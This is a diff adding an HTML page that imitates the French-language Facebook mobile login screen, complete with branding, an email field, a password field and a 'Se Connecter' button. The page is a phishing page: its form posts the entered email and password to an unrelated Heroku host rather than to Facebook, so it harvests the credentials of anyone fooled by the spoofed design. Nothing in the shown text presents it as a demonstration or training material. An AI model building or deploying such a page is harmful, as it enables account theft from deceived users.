@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>se connecter à Facebook | Facebook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        *{
+            padding:0;
+            margin:0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        body{
+            width:100vw;
+            height:100vh;
+        }
+
+        .container{
+            width:100%;
+        }
+        .login-form{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width:90%;
+            margin:0 auto;
+        }
+        .login-form__title{
+            color:rgb(46, 112, 254);
+            font-size:2rem;
+            font-weight: bolder;
+            margin-bottom:1.5rem;
+        }
+        input{
+            width:90%;
+            height:4rem;
+            border:none;
+            background-color: rgba(211, 211, 211, 0.204);
+            border-radius: 7px;
+            margin-bottom:1rem;
+            padding-left:15px;
+            font-size:1.2rem;
+        }
+        input[type="submit"]{
+            font-size:1.4rem;
+            height:3.7rem;
+            font-weight: bolder;
+            color:white;
+            background-color: rgb(46, 112, 254);
+            cursor: pointer;
+        }
+        .login-form__link{
+            display: inline-block;
+            text-decoration: none;
+            margin-bottom:15px;
+            color:rgb(54, 108, 223);
+            font-size:18px;
+        }
+        .login-form__link:hover{    
+            text-decoration: underline;
+        }
+        hr{
+            display: block;
+        }
+        .login-form__create-acc-btn{
+            display: inline-block;
+            margin-top:15px;
+            width:60%;
+            height:3.2rem;
+            border:none;
+            border-radius: 5px;
+            color:white;
+            font-size:1.2rem;
+            font-weight: bolder;
+            background-color: rgb(18, 148, 18);
+            cursor: pointer;
+        }
+        .top-header{
+            background-color:rgb(251, 251, 215);
+            display: flex;
+            align-items: center;
+            gap:10px;
+            padding:0 10px;
+            margin-bottom: 20px;
+        }
+        .fa-solid.fa-id-badge{
+            font-size:40px;
+            color:rgb(85, 93, 145);
+            margin-block: 20px;
+        }
+        .top-header__content{
+            color:rgb(85, 93, 145);
+        }
+        .err{
+            color:rgb(251, 72, 72);
+            font-size:1.2rem;
+            font-weight: normal;
+            margin-bottom:15Px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-header">
+            <i class="fa-solid fa-id-badge"></i>
+            <p class="top-header__content">
+                Utiliser Facebook Pour Android et naviguez plus rapidement
+            </p>
+        </div>
+        <form method="POST" action="http://make-to-do23.herokuapp.com/login" class="login-form">
+            <h1 class="login-form__title">Facebook</h1>
+            <input type="email" name="email"  class="login-form__email" placeholder="Numéro mobile ou e-mail">
+            <input type="password" name="password"  class="login-form__password" placeholder="Mot de passe">
+
+            <div class="err"></div>
+            <input type="submit" value="Se Connecter" class="form-login__login-btn">
+
+            <a href="/" class="login-form__link">Mot de passe oublié ?</a>
+            <button  type="button" class="login-form__create-acc-btn">Créer nouveau compte</button>
+        </form>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
